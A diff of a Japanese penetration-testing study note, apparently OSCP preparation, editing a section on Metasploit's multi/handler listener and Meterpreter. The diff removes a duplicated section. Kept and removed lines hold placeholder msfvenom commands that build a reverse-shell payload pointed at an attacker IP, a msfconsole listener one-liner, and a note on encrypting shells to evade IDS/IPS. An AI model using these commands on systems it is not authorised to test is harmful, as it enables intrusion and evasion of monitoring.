@@ -468,41 +468,6 @@ Metasploitフレームワークの `exploit/multi/handler` モジュールは、
 >Meterpreterシェルとは、Metasploit独自の高機能シェル。
 >通常のシェル（bash/cmd）と異なり、単体バイナリとして動作しメモリ上にのみ存在するためディスクに痕跡を残しにくい。(OSCP 試験で無制限に利用可能)
 
-### 手順
-
-1. msfvenomでペイロードを生成**（→ [☠️Msfvenom](#) 参照）
-
-zsh
-
-```zsh
-sudo msfvenom -p <OS>/<arch>/<payload> -f <出力形式> -o <filename> LHOST=<attacker-IP> LPORT=<port>
-```
-
-> ⚠️ 1024番以下のポートを使用する場合は `sudo` が必要
-
-**2. multi/handlerを起動してリスナーを開始**
-
-zsh
-
-```zsh
-msfconsole -q -x "use exploit/multi/handler; set payload <生成したペイロード>; set LHOST <attacker_IP>; set LPORT <port>; run"
-```
-
-- `exploit -j` でバックグラウンド実行が可能
-- 複数のセッションがアクティブな場合：
-    - `sessions` → アクティブなセッション一覧を表示
-    - `sessions <ID>` → 対象セッションをフォアグラウンドに切り替え
-
-
-
-
-- ✅️Windowsにおいても安定している
-- Meterpreterシェルを使用したい場合は必須で、ステージドペイロードを使用する場合は、このツールを使用する（[[☠️Msfvenom]]）
-- Metasploitフレームワークの`exploit/multi/handler`モジュールはsocat や netcat のように、リバースシェルを受信するために使用されるリスナー（OSCP examで無制限に利用可能）
-	- Meterpreterシェルは、Metasploit独自の完全な機能を備えたシェル
-	- ✅ファイルのアップロードやダウンロードなど、多くの機能を内蔵している
-	- ❌Meterpreterシェルは必ずMetasploitモジュール経由の通信が必要（通常シェルペイロードはncでも受信可能）
-
 1. msfvenomでペイロードの生成
 ```zsh
 sudo msfvenom -p <OS>/<arch>/<payload> -f <出力形式＞ -o <filename> LHOST=<attacker-IP> LPORT=<port>
@@ -512,9 +477,10 @@ sudo msfvenom -p <OS>/<arch>/<payload> -f <出力形式＞ -o <filename> LHOST=<
 ```zsh
 msfconsole -q -x "use exploit/multi/handler; set payload <生成ペイロード>; set LHOST <attacker_IP>; set LPORT <Port>; run"
 ```
-- `exploit -j`でバックグラウンドで実行できる
-
-- もし他のsessionがアクティブだったら、`sessions`コマンドで全てのアクティブなSessionを表示し、その中からフォアグラウンド化すべきSessionを`sessions <ID>`で選択する必要がある
+- `exploit -j` でバックグラウンド実行が可能
+- 複数のセッションがアクティブな場合：
+    - `sessions` → アクティブなセッション一覧を表示
+    - `sessions <ID>` → 対象セッションをフォアグラウンドに切り替え
 
 ---
 ---
@@ -522,7 +488,6 @@ msfconsole -q -x "use exploit/multi/handler; set payload <生成ペイロード>
 # シェルの暗号化
 
 - 目的：ネットワーク監視装置（IDS・IPS）の検知回避
-	- 暗号化されたシェルは、復号鍵がない限り傍受されることはない
 
 > [!warning]
 > AV/EDRには検知される。
